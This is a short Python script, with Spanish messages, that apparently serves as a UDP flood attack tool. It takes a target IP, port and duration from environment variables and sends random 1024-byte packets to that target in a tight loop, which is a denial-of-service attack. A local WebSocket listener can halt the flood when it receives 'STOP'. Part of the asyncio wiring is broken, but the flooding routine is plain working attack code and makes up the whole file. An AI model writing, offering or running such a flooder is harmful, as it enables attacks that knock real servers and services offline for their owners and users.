import socket
import random
import time
import os
import asyncio
import websockets

UDP_IP = os.environ.get("IP")
UDP_PORT = int(os.environ.get("PORT"))
DURATION = int(os.environ.get("TIEMPO"))
WEBSOCKET_URL = "ws://localhost:8765"

running = True

async def flood():
    global running
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    start_time = time.time()
    while running and time.time() - start_time < DURATION:
        sock.sendto(bytes, (UDP_IP, UDP_PORT))
    print("Ataque finalizado.")

async def websocket_handler(websocket):
    global running
    async for message in websocket:
        if message == "STOP":
            print("Recibido comando STOP.")
            running = False
            break

async def main():
    async with websockets.serve(websocket_handler, "localhost", 8765):
        print("Servidor WebSocket escuchando en ws://localhost:8765")
        await asyncio.Future()  # Mantiene el servidor WebSocket en ejecución
    await flood()

if __name__ == "__main__":
    try:
        asyncio.run(asyncio.gather(main(), flood()))
    except KeyboardInterrupt:
        print("Interrupción manual.")
